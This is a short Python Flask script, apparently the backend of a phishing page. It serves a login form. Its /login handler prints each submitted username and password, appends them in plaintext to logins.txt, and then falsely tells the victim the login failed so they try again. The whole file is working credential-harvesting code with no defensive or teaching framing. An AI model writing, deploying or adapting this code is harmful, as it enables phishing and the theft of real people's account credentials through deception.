from flask import Flask, request, render_template
import os

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    print(f"🔐 New login: {username} / {password}")

    with open('logins.txt', 'a') as f:
        f.write(f"{username} / {password}\n")

    return "<h3>Login failed. Please try again.</h3>"

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))  # 👈 обязательно!
    app.run(host='0.0.0.0', port=port)
